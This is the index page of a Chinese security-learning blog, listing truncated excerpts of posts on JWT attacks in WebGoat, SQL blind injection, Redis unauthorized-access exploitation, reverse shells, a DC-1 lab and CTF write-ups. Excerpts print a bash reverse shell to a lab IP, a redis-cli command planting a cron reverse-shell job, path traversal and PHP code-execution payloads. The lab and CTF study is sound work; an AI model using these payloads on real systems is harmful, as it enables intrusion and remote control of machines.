<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Bamboo22 's Blog - Bamboo的博客</title><meta name="author" content="Bamboo22"><meta name="copyright" content="Bamboo22"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="https://www.jinrishici.com/">
<meta property="og:type" content="website">
<meta property="og:title" content="Bamboo22 's Blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Bamboo22 's Blog">
<meta property="og:description" content="https://www.jinrishici.com/">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg">
<meta property="article:author" content="Bamboo22">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg"><link rel="shortcut icon" href="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg"><link rel="canonical" href="http://example.com/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Bamboo22 \'s Blog',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2024-01-23 10:27:20'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="Bamboo22 's Blog"><span class="site-name">Bamboo22 's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">Bamboo22 's Blog</h1><div id="site-subtitle"><span id="subtitle"></span></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left"><a href="/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" title="JWT的攻击方法"><img class="post-bg" src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JWT的攻击方法"></a></div><div class="recent-post-info"><a class="article-title" href="/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" title="JWT的攻击方法">JWT的攻击方法</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">web基础漏洞</a></span></div><div class="content">JWT的攻击方法webgoat靶场搭建我用的是docker搭建，这样快一点，也可以在GitHub上下载了直接拖到kali里，但是很慢
12docker pull webgoat/webgoat-8.0    拉取dockerdocker images     查看容器是否下载成功

运行靶场
1sudo docker run -p 8080:8080 -t webgoat/webgoat-8.0 

之后通过浏览器访问 http://127.0.0.1:8080/WebGoat 就可以了
在宿主机上也能访问http://192.168.144.128:8080/WebGoat，方便抓包
github官方连接，也可以直接下载拖到kali上Releases · WebGoat/WebGoat (github.com)


第一次进去要注册，之后登录就可以用了
空加密验证攻击
打开JWT tokens的第4部分
点击vote now 弹窗提示我们游客不能投票，需要登录
这关的要求是切换到管理员身份就能重置投票

点击切换到Tom并抓包

抓包后能看到token值 （这里记得多抓几次 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2024/01/22/JWT/" title="JWT"><img class="post-bg" src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JWT"></a></div><div class="recent-post-info"><a class="article-title" href="/2024/01/22/JWT/" title="JWT">JWT</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">web基础漏洞</a></span></div><div class="content">JWT什么是JWTJWT介绍
JSON Web Token（JSON Web令牌）


**JWT(json web token)**是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准。 JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源。比如用户登录。在传统的用户登录认证中，因为http是无状态的，所以都是采用session方式。用户登录成功，服务端会保存一个session，服务端会返回给客户端一个sessionId，客户端会把sessionId保存在cookie中，每次请求都会携带这个sessionId。 
cookie+session这种模式通常是保存在内存中，而且服务从单服务到多服务会面临的session共享问题。虽然目前存在使用Redis进行Session共享的机制，但是随着用户量和访问量的增加，Redis中保存的数据会越来越多，开销就会越来越大，多服务间的耦合性也会越来越大，Redis中的数据也很难进行管理，例如当Redis集群服务器出现Down机的情况下，整个业务系统随之将变为不可用的状态。而JWT不是这样的 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" title="SQL盲注脚本编写"><div class="post-bg" style="background: com"></div></a></div><div class="recent-post-info"><a class="article-title" href="/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" title="SQL盲注脚本编写">SQL盲注脚本编写</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">web基础漏洞</a></span></div><div class="content">SQL盲注脚本编写Python requests 模块Python requests 是一个常用的 HTTP 请求库，可以方便地向网站发送 HTTP 请求，并获取响应结果。
requests 模块比 urllib 模块更简洁。
使用 requests 发送 HTTP 请求需要先导入 requests 模块：
1import requests

导入后就可以发送 HTTP 请求，使用 requests 提供的方法向指定 URL 发送 HTTP 请求，例如：
实例:
12345678\# 导入 requests 包import requests\# 发送请求x = requests.get('https://www.runoob.com/')\# 返回网页内容print(x.text)

每次调用 requests 请求之后，会返回一个 response 对象，该对象包含了具体的响应信息，如状态码、响应头、响应内容等：
123print(response.status_code)  # 获取响应状态码print(response.headers)  # 获取响应头pri ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2024/01/22/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/" title="Redis的几种利用方法"><img class="post-bg" src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redis的几种利用方法"></a></div><div class="recent-post-info"><a class="article-title" href="/2024/01/22/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/" title="Redis的几种利用方法">Redis的几种利用方法</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">web基础漏洞</a></span></div><div class="content">Redis的几种利用方法什么是redisRedis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivota赞助。
redis漏洞原理Redis默认情况下是绑定在0.0.0.0:6379端口的，如果没有设置密码（一般密码为空）或者密码为弱密码的情况下并且也没有进行有效保护措施，那么处于公网的redis服务就会被任意的用户未授权访问，读取数据，甚至利用redis自身的命令，进行写入文件操作，这样就会恶意攻击者利用redis未授权漏洞进行进一步攻击。
redis安装这里使用的是kali和Ubuntu
kali下安装：
123456789第一步 wget http://download.redis.io/releases/redis-2.8.17.tar.gz#下载redis第二步 tar xzf redis-2.8.17.tar.gz ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2024/01/22/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell"><img class="post-bg" src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="反弹shell"></a></div><div class="recent-post-info"><a class="article-title" href="/2024/01/22/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell">反弹shell</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">web基础漏洞</a></span></div><div class="content">反弹shell原理反弹shell：控制端监听某个端口，被控制端发起请求到该端口，并将命令行的输入输出传到控制端
正向getshell: 控制端(也就是我们自己的机器)发送请求去连接被控端(目标机器)的方式。不过这种方式会受到防火墙,路由,等各种很多因素影响,很难成功。

反弹shell: 被控端主动发送请求连接我们的控制端。这种方法是可以想办法避开防火墙和路由的一些限制的!

为什么需要反弹shell？
当正向连接不可达时候

客户机中了木马，但是在局域网内，无法正向连接。
由于防火墙和局域网的限制，对方只能发送请求，不可主动接受请求

操作bash反弹：这是最常见也是最简单的一种反弹shell的方式，直接看命令：
攻击机：
1nc -nlvp 1231

受害机：
1bash -i &gt;&amp; /dev/tcp/192.168.144.128/1231 0&gt;&amp;1




实现命令执行

nc反弹e被阉割的情况：先说一下不用nc -e 这个选项的时候，我们应该怎么做：
攻击机器开启两个端口的监听：（为什么要开两个，这个下面会讲）
12nc -lvp 6666 nc ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2024/01/22/%E8%A7%A3%E5%86%B3Ubuntu%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/" title="解决Ubuntu计划任务弹shell失败"><img class="post-bg" src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="解决Ubuntu计划任务弹shell失败"></a></div><div class="recent-post-info"><a class="article-title" href="/2024/01/22/%E8%A7%A3%E5%86%B3Ubuntu%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/" title="解决Ubuntu计划任务弹shell失败">解决Ubuntu计划任务弹shell失败</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">web基础漏洞</a></span></div><div class="content">解决Ubuntu计划任务弹shell失败在复现redis时几种情况都复现成功了，只有计划任务弹shell没有成功，今天就来探究一下
当时的情况是：
已经成功写入反弹信息，但是还是无法反弹shell，
当时推测应该是利用redis未授权访问写的任务计划文件都有乱码，这是乱码来自redis的缓存数据，这个问题无法解决的。centos会忽略乱码去执行格式正确的任务计划，而ubuntu和debian并不会忽略这些乱码，所以导致命令执行失败。试了很多次都没有执行成功。
123456redis-cli -h 192.168.144.130set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.144.130/4444 0&gt;&amp;1\n\n"#前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。config set dir /var/spool/cron/crontabscon ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2024/01/22/DC%E9%9D%B6%E5%9C%BA/" title="DC1 &amp; DC靶场搭建"><img class="post-bg" src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC1 &amp; DC靶场搭建"></a></div><div class="recent-post-info"><a class="article-title" href="/2024/01/22/DC%E9%9D%B6%E5%9C%BA/" title="DC1 &amp; DC靶场搭建">DC1 &amp; DC靶场搭建</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-22T13:56:53.284Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="content">DC靶场环境搭建官网下载链接https://www.vulnhub.com/
下载后用vmware打开这个.ova文件

按照提示安装，成功以后就是这个登录界面

渗透的目标就是拿到密码登录
注意这里我是用到NAT模式，保证靶机和攻击机在同一网段
DC-1来到第一关，我们用kali做攻击机，DC-1为靶机
 
一、信息搜集1.探测目标IP地址探测当前网段下的IP
探测主机的工具有很多，常见的有arp-scan、nmap还有netdiscover

arp-scan

1arp-scan -l


可以看到同一网段上的所有IP

查看靶机的MAC地址，现在可以确定靶机的ip为192.168.85.130

也可以用nmap

123nmap -sP 192.168.85.0/24    ip后面改为了0/24, 在这里“192.168.85.0/24”表示的是这个网段的IP地址从从192.168.85.1开始，到192.168.85.254结束（192.168.85.0和192.168.85.255有特殊含义不能当做ip地址）；子网掩码是255.255.255.0


同样也能扫出IP
 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2024/01/22/gopher%E5%8D%8F%E8%AE%AE/" title="gopher协议"><img class="post-bg" src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="gopher协议"></a></div><div class="recent-post-info"><a class="article-title" href="/2024/01/22/gopher%E5%8D%8F%E8%AE%AE/" title="gopher协议">gopher协议</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-22T13:56:53.284Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">web基础漏洞</a></span></div><div class="content">gopher协议什么是gopher协议Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；

gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议

但是gopher协议在各个语言中是有使用限制的。



语言
支持情况



PHP
–wite-curlwrappers且php版本至少为5.3


Java
小于JDK1.7


Curl
低版本不支持


Perl
支持


ASP.NET
小于版本3


12--wite-curlwrappers：运用curl工具打开url流curl使用curl --version查看版本以及支持的协议


上面说的curl低版本不 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2024/01/22/%5BSYCTF2023%5DCarelessPy/" title="SYCTF 2023 CarelessPy"><img class="post-bg" src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SYCTF 2023 CarelessPy"></a></div><div class="recent-post-info"><a class="article-title" href="/2024/01/22/%5BSYCTF2023%5DCarelessPy/" title="SYCTF 2023 CarelessPy">SYCTF 2023 CarelessPy</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-22T13:56:53.282Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF%E8%B5%9B%E9%A2%98/">CTF赛题</a></span></div><div class="content">[SYCTF2023]CarelessPy
打开环境说下载图片，但其实没有什么用
查看源码，发现 /eval 和 /login 

进入 /eval 发现是一个命令执行，但是只要传cmd就会报错

进入/login有一个登录框，但是登录不成功


在/login中猜测这个应该就是flask的session伪造，伪造一个成功登陆的cookie从而实现登录，那需要的秘应该就是在/eval中去找
我们先去/eval
这里一个一个传参去试（至于为什么我也不知道），试到app就成功了

进到这儿继续试

得到这个后就进入一开始的下载页面，就能下载.pyc文件，注意这里需要yong../进行目录穿越，因为要将工作目录转到网站更目录，所以要退三次

123/eval?cmd=app/eval?cmd=app/__pycache__/download?file=../../..//app/__pycache__/part.cpython-311.pyc

成功后就会下载一个.pyc文件，直接开是打不开的，改成.txt就可以看了（里面的乱码是没用的）

1SECRET_KE ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2024/01/22/%5BNEEPU-CTF%202023%5Dezrce/" title="NEEPU-CTF 2023 ezrce"><img class="post-bg" src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NEEPU-CTF 2023 ezrce"></a></div><div class="recent-post-info"><a class="article-title" href="/2024/01/22/%5BNEEPU-CTF%202023%5Dezrce/" title="NEEPU-CTF 2023 ezrce">NEEPU-CTF 2023 ezrce</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2024-01-22T13:56:53.280Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF%E8%B5%9B%E9%A2%98/">CTF赛题</a></span></div><div class="content">[NEEPU-CTF 2023]ezrce
打开环境后看到提交框，随便输入点东西

可以看到源码
$name1=preg_replace('/hahaha/e',$qaq,$name);
/e说明能当做php代码执行，所以尝试命令执行
开始传参
12http://45e4936d.clsadp.com/?key=1223    //getname=hahaha&amp;qaq=system(ls);             //post


能够看到当前目录下的文件，但是ls更目录就看不到了，这里是/被过滤了
无参数rce
查看更目录下文件，其实就是构造一个/
12http://45e4936d.clsadp.com/?key=1223name=hahaha&amp;qaq=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));

因为获取/有随机性，多刷新几次

看到flag后就想办法构造读flag
12print_r(array_flip(scandir(chr(ord(strrev(crypt( ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">Bamboo22</div><div class="author-info__description">https://www.jinrishici.com/</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bamb0022"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">博客已于2024年1月22日完成迁移，将会持续更新</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" title="JWT的攻击方法"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JWT的攻击方法"></a><div class="content"><a class="title" href="/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" title="JWT的攻击方法">JWT的攻击方法</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/JWT/" title="JWT"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JWT"></a><div class="content"><a class="title" href="/2024/01/22/JWT/" title="JWT">JWT</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" title="SQL盲注脚本编写"><div style="background: com"></div></a><div class="content"><a class="title" href="/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" title="SQL盲注脚本编写">SQL盲注脚本编写</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/" title="Redis的几种利用方法"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redis的几种利用方法"></a><div class="content"><a class="title" href="/2024/01/22/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/" title="Redis的几种利用方法">Redis的几种利用方法</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="反弹shell"></a><div class="content"><a class="title" href="/2024/01/22/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell">反弹shell</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
            <i class="fas fa-folder-open"></i>
            <span>分类</span>
            
            </div>
            <ul class="card-category-list" id="aside-cat-list">
